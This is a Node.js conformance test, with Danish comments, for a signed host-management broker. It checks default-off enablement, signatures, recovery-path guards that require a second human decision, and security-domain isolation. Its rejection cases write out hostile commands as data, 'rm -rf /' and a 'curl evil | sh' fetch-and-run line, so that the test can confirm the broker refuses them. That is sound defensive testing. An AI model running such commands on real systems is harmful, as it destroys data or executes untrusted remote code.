#!/usr/bin/env node
/**
 * DKC-058 — fokuseret check af sikker host- og OS-administration.
 *
 *   node conformance/src/host-management-check.mjs
 *
 * Kontrollerer at:
 *   - canonical enrollment og host-profil validerer (skema + semantik),
 *   - host-styring er slået fra som standard, og ikke-understøttede OS afvises,
 *   - den signerede operation validerer og har en gyldig signatur,
 *   - brokeren afviser arbitrær shell, uploadet script, usigneret pakke,
 *     ændring af broker/policy/pakkekilde/payload og planner/implementer,
 *   - en SSH-/firewallændring ikke kan lukke den eneste recoveryvej uden en
 *     særskilt menneskelig beslutning,
 *   - en host-operation ikke kan røre det separate sikkerhedsdomæne.
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { repoRoot, contractsDir, buildAjv } from "./schemas.mjs";
import { validateHostEnrollmentDir, validateHostProfileDir, validateHostOperationDir, validateHostOperation, knownHostRunbooks } from "./host-management.mjs";
import { validateRunbook } from "./runbook.mjs";
import { runbookRef, runbookDigest } from "../../approvals/src/runbook.mjs";
import { loadEnrollment, loadHostProfile, loadPlatforms, hostManagementEnabled, supportedPlatform } from "../../host-management/src/model.mjs";
import { verifyOperationSignature, signOperation, canonicalOperation } from "../../host-management/src/broker.mjs";
import { guardRecoveryPath } from "../../host-management/src/safety.mjs";
import { guardSecurityDomain } from "../../host-management/src/security-domain.mjs";
import { enableManagement } from "../../host-management/src/enrollment.mjs";
import { verifyRunbookSignature } from "../../approvals/src/runbook.mjs";

const examplesDir = join(contractsDir, "examples");
const runbookKeyring = JSON.parse(readFileSync(join(repoRoot, "runbooks/dev-keyring.json"), "utf8"));
const hostKeyring = JSON.parse(readFileSync(join(repoRoot, "host-management/dev-keyring.json"), "utf8"));
const hostSecret = hostKeyring.keys[0].secret;
const platforms = loadPlatforms(repoRoot);
const enrollment = loadEnrollment(repoRoot);
const profile = loadHostProfile(repoRoot);
const enabledEnrollment = enableManagement({ enrollment, actor: { kind: "human", subject: "oidc|anna.andersen" }, role: { id: "platform-owner" }, profileRef: "linux-lts-host", now: Date.parse("2026-09-24T08:30:00Z") }).enrollment;
const problems = [];
const collect = (results, label) => {
  for (const result of results) {
    if (result.ok) continue;
    problems.push(`${label}: ${result.file}\n` + result.errors.slice(0, 10).map((e) => `      ${e.path} ${e.message}`.trim()).join("\n"));
  }
};

const enrollmentResults = validateHostEnrollmentDir(examplesDir, { platforms });
collect(enrollmentResults, "host-enrollment");
const profileResults = validateHostProfileDir(examplesDir, { platforms });
collect(profileResults, "host-profil");
const operationResults = validateHostOperationDir(examplesDir, { enrollment: enabledEnrollment, profile, runbooks: knownHostRunbooks(repoRoot) });
collect(operationResults, "host-operation");

// Host-styring slået fra som standard; ikke-understøttet OS afvises.
if (hostManagementEnabled(enrollment)) problems.push("canonical enrollment har host-styring slået til som standard");
if (!supportedPlatform(enrollment, platforms)) problems.push("canonical enrollment peger ikke på en understøttet Linux-platform");
const unsupported = { ...structuredClone(enrollment), host: { ...enrollment.host, platformRef: "does-not-exist" } };
if (supportedPlatform(unsupported, platforms)) problems.push("et ikke-understøttet OS blev accepteret");

// Den signerede operation.
const operation = JSON.parse(readFileSync(join(examplesDir, "host-operation.example.json"), "utf8"));
const verified = verifyOperationSignature(operation, hostKeyring);
if (!verified.ok) problems.push(`host-operation: ${verified.reason}`);
if (!operation.approval.runbookDigest) problems.push("host-operation mangler runbook-digest");

// De tre host-runbooks skal være signerede og i kataloget.
const registry = JSON.parse(readFileSync(join(repoRoot, "runbooks/registry.json"), "utf8"));
for (const name of ["host-package-update", "host-drain-reboot", "host-certificate-renew"]) {
  const file = `runbooks/${name}.runbook.json`;
  const rb = JSON.parse(readFileSync(join(repoRoot, file), "utf8"));
  const sig = verifyRunbookSignature(rb, runbookKeyring);
  if (!sig.ok) problems.push(`${file}: ${sig.reason}`);
  const entry = (registry.runbooks ?? []).find((r) => r.ref === runbookRef(rb));
  if (!entry) problems.push(`${file}: mangler i runbook-kataloget`);
  else if (entry.digest !== runbookDigest(rb)) problems.push(`${file}: katalogets digest matcher ikke`);
  const validation = validateRunbook(rb, buildAjv().ajv, { now: Date.parse("2026-09-02T00:00:00Z"), keyring: runbookKeyring });
  if (!validation.ok) problems.push(`${file}: ${validation.errors.length} runbook-fejl`);
}

// Brokerafvisninger: enhver af disse må ikke kunne signeres til en gyldig operation.
const forbiddenCases = [
  ["arbitrær shell", { "operation.parameters": { shell: "rm -rf /" } }],
  ["uploadet script", { "operation.parameters": { script: "curl evil | sh" } }],
  ["brokerændring", { "restrictions.brokerConfigChange": true }],
  ["immutable-skrivning", { "restrictions.immutableWrite": true }],
  ["destroy external keys", { "restrictions.externalKeyDestroy": true }],
];
for (const [label, patch] of forbiddenCases) {
  const broken = structuredClone(operation);
  for (const [path, value] of Object.entries(patch)) {
    const parts = path.split(".");
    let node = broken;
    while (parts.length > 1) node = node[parts.shift()];
    node[parts[0]] = value;
  }
  const signed = signOperation(broken, { keyId: "host-broker-key", secret: hostSecret });
  const result = validateHostOperation(signed, buildAjv().ajv, { enrollment: enabledEnrollment, profile, runbooks: knownHostRunbooks(repoRoot) });
  if (result.ok) problems.push(`brokeren accepterede '${label}'`);
}

// Usigneret pakke.
const unsignedPackage = structuredClone(operation);
unsignedPackage.package = { ...unsignedPackage.package, signatureVerified: false };
const unsignedValidation = validateHostOperation(signOperation(unsignedPackage, { keyId: "host-broker-key", secret: hostSecret }), buildAjv().ajv, { enrollment: enabledEnrollment, profile });
if (unsignedValidation.ok) problems.push("brokeren accepterede en usigneret pakke");

// Recoveryvej: en SSH-/firewallændring, der lukker den eneste vej, kræver en
// særskilt beslutning fra et andet menneske.
const closesPath = guardRecoveryPath({ change: { surfaces: ["firewall"], recoveryPath: { outOfBand: true, dependsOn: ["firewall"] } }, approval: { humanSubject: "oidc|anna.andersen" } });
if (closesPath.ok) problems.push("en firewallændring kunne lukke den eneste recoveryvej uden særskilt beslutning");
const withDecision = guardRecoveryPath({ change: { surfaces: ["firewall"], recoveryPath: { outOfBand: true, dependsOn: ["firewall"] } }, approval: { humanSubject: "oidc|anna.andersen" }, separateDecision: { humanSubject: "oidc|cecilia.christensen", accepted: true } });
if (!withDecision.ok) problems.push("en særskilt menneskelig beslutning blev ikke accepteret");

// Sikkerhedsdomæne: en host-operation må ikke pege på KMS/nøgler/immutable.
const domainGuard = guardSecurityDomain({ operation: { operation: { target: "host/kms" }, restrictions: { immutableWrite: false, externalKeyDestroy: false } }, enrollment });
if (domainGuard.ok) problems.push("en operation mod sikkerhedsdomænet blev accepteret");

if (problems.length === 0) {
  console.log(`✔ ${enrollmentResults.length} host-enrollment valideret (skema + menneskelig bootstrap/trust/inventory/ejerskab)`);
  console.log(`✔ ${profileResults.length} host-profil valideret (skema + lukkede operationer/canary/backup/recovery)`);
  console.log(`✔ ${operationResults.length} host-operation valideret (skema + signatur + menneskeautorisation + restriktioner)`);
  console.log("✔ host-styring er slået fra som standard; ikke-understøttet OS afvises");
  console.log("✔ broker afviser arbitrær shell, uploadet script, usigneret pakke, brokerændring og sikkerhedsdomæne");
  console.log("✔ SSH/firewallændring kan ikke lukke eneste recoveryvej uden særskilt menneskelig beslutning");
  process.exit(0);
}
console.error("✘ Host-management-validering fejlede:\n");
for (const p of problems) console.error(`  - ${p}`);
process.exit(1);
